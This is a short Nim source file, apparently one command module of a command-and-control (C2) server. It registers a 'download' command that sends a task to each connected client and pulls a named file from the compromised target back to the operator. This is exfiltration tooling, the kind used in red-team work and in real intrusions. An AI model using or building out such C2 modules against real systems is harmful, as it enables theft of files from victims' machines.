import std/[
  asyncdispatch, 
  tables, 
  json
]

import ../../types, ../../communication, ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a path, see 'help download'"
    return

  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("download", %*[ args[0] ])
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 1,
  usage: @["download \"[path]\""],
  cliMode: @[ClientInteractMode],
  description: "Download a file from the target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)